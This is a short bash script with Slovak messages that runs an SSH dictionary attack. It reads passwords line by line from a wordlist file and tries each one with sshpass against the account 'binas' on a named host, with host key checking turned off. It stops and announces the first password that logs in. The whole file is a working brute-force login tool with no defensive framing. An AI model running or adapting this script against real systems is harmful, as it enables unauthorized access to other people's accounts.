#!/bin/bash


#HESLO = $(cat cain.txt)

while read -r HESLO; do
     echo " $HESLO"

  sshpass -p$HESLO ssh -o StrictHostKeyChecking=no binas@atlantis.cnl.sk exit
       

  if [[ $? -eq 0 ]]; then
   echo " $HESLO je spravne heslo"
   exit


  fi

done < cain.txt


echo "nespravne heslo"


